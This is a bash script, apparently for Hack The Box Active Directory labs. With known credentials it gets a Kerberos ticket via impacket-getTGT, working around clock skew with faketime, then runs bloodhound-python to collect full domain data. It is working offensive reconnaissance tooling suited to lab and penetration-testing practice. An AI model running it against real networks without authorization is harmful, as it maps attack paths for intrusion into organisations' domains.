#!/bin/bash
# This script is perfect when you have creds for a windows machine and you want to scan for bloodhound
# I use faketime cause i am at my VM and i find it easier to put it when ever i want

DOMAIN="<name>.htb"
REALM="<NAME>.HTB"
DC_IP="10.10.XX.XX"
USER="<username>"
PASS="<password>"
CCACHE_FILE="<username>.ccache"

echo "[*] Adding $DOMAIN to /etc/hosts if not exists..."
grep -q "$DOMAIN" /etc/hosts || echo "$DC_IP $DOMAIN" | sudo tee -a /etc/hosts
# Put dc.name.htb too:
# echo $DC_IP dc.$DOMAIN | sudo tee -a /etc/hosts

echo "[*] Installing krb5-user if missing..."
# sudo apt-get update -qq
sudo apt-get install -y krb5-user

echo "[*] Syncing system time with DC ($DC_IP)..."
ntpdate -u $DC_IP

# you can try $(date -d "+3 minutes" + ......)
FAKETIME_DATE=$(date +"%Y-%m-%d %H:%M:%S")
echo "[*] Using faketime date: $FAKETIME_DATE"

echo "[*] Creating /etc/krb5.conf..."
sudo bash -c "cat > /etc/krb5.conf" <<EOF
[libdefaults]
        default_realm = <NAME>.HTB
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true
        dns_canonicalize_hostname = false
        dns_lookup_realm = false
        dns_lookup_kdc = true
        k5login_authoritative = false
[realms]
        <NAME>.HTB = {
                kdc = <name>.htb
                admin_server = <name>.htb
                default_admin = <name>.htb
        }
[domain_realm]
        .<name>.htb = <NAME>.HTB
EOF

echo "[*] Getting Kerberos TGT ticket via impacket-getTGT..."
faketime "$FAKETIME_DATE" impacket-getTGT -dc-ip $DC_IP $DOMAIN/$USER:"$PASS"

if [ $? -ne 0 ]; then
    echo "[!!!] impacket-GetTGT failed, exiting."
    exit 1
fi

echo "[*] Setting KRB5CCNAME to $CCACHE_FILE..."
export KRB5CCNAME=$CCACHE_FILE
sleep 3
echo "[*] Verifying ticket with klist..."
klist

echo "[*] Trying bloodhound..."
faketime "$FAKETIME_DATE" bloodhound-python -u $USER -no-pass -c ALL -d $DOMAIN -ns $DC_IP --zip -k
ntpdate -u $DC_IP
ntpdate -u $DC_IP
